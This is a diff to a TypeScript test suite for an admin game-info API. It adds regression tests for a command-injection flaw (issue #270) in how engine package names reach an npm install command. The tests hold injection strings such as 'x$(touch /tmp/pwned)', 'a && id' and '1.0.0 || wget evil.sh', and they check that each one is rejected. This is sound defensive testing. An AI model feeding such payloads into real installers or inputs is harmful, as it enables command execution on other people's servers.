@@ -16,17 +16,21 @@ const baseInfo = {
 	meta: { public: true },
 };
 
+async function makeAdminHeaders() {
+	const adminId = new ObjectId();
+	await colls.users.insertOne(testUser({ _id: adminId, authority: "admin" }));
+	const code = generateRefreshCode();
+	const tokenDoc = { user: adminId, codeHash: hashRefreshCode(code), createdAt: new Date() };
+	await colls.jwtRefreshTokens.insertOne(tokenDoc);
+	const token = await createAccessToken(tokenDoc, ["all"], true);
+	return { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };
+}
+
 describe("Admin gameinfo API — alias (issue #106)", () => {
 	let headers: Record<string, string>;
 
 	before(async () => {
-		const adminId = new ObjectId();
-		await colls.users.insertOne(testUser({ _id: adminId, authority: "admin" }));
-		const code = generateRefreshCode();
-		const tokenDoc = { user: adminId, codeHash: hashRefreshCode(code), createdAt: new Date() };
-		await colls.jwtRefreshTokens.insertOne(tokenDoc);
-		const token = await createAccessToken(tokenDoc, ["all"], true);
-		headers = { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };
+		headers = await makeAdminHeaders();
 	});
 
 	after(() => db().dropDatabase());
@@ -62,5 +66,70 @@ describe("Admin gameinfo API — alias (issue #106)", () => {
 		await put({ ...baseInfo, alias: "Gem Trader" });
 		doc = await put(baseInfo);
 		assert.strictEqual(doc?.alias, "Gem Trader");
+	});
+});
+
+const withEngine = (name: string, version = "1.0.0") => ({
+	label: "Evil",
+	engine: { package: { name, version }, entryPoint: "dist/index.js" },
+});
+
+// Issue #270: the game-server installer builds `npm install <name>@<version>` from
+// engine.package — before validation, a package name with shell metacharacters
+// (`x$(touch …)`, `;`, backticks) reached the spawn and executed on the game-server
+// host. The upsert route must reject such payloads with 400 and store nothing.
+describe("Admin gameinfo API — engine.package validation (#270)", () => {
+	let headers: Record<string, string>;
+
+	before(async () => {
+		headers = await makeAdminHeaders();
+	});
+
+	after(() => db().dropDatabase());
+
+	async function upsert(body: unknown) {
+		const res = await fetch(`${baseURL()}/api/admin/gameinfo/evilgame/1`, {
+			method: "POST",
+			headers,
+			body: JSON.stringify(body),
+		});
+		return { status: res.status, body: await res.text() };
+	}
+
+	it("rejects package names with shell metacharacters and stores nothing", async () => {
+		for (const name of ["x$(touch /tmp/pwned)", "a;touch /tmp/pwned", "`touch /tmp/pwned`", "a && id", "a|id"]) {
+			const res = await upsert(withEngine(name));
+			assert.strictEqual(res.status, 400, `expected 400 for ${JSON.stringify(name)}, got ${res.status}: ${res.body}`);
+		}
+		assert.strictEqual(await colls.gameInfos.findOne({ _id: { game: "evilgame", version: 1 } }), null);
+	});
+
+	it("rejects versions that are not pinned semver", async () => {
+		for (const version of ["$(id)", "^1.0.0", "1.0.0 || wget evil.sh", "latest"]) {
+			const res = await upsert(withEngine("evil-engine", version));
+			assert.strictEqual(
+				res.status,
+				400,
+				`expected 400 for version ${JSON.stringify(version)}, got ${res.status}: ${res.body}`,
+			);
+		}
+		assert.strictEqual(await colls.gameInfos.findOne({ _id: { game: "evilgame", version: 1 } }), null);
+	});
+
+	it("accepts a valid scoped/unscoped package name and semver version", async () => {
+		for (const name of ["@gaia-project/engine", "container-engine", "@boardgamers/powergrid-engine"]) {
+			const res = await upsert(withEngine(name));
+			assert.strictEqual(res.status, 200, `expected 200 for ${name}, got ${res.status}: ${res.body}`);
+		}
+		const doc = await colls.gameInfos.findOne({ _id: { game: "evilgame", version: 1 } });
+		assert.strictEqual(doc?.engine?.package.name, "@boardgamers/powergrid-engine");
+
+		const ranged = await upsert(withEngine("evil-engine", "1.2.3-beta.1+build.5"));
+		assert.strictEqual(ranged.status, 200, ranged.body);
+	});
+
+	it("keeps the loose-record behavior for payloads without an engine", async () => {
+		const res = await upsert({ label: "No engine", customField: { nested: [1, 2] } });
+		assert.strictEqual(res.status, 200, res.body);
 	});
 });
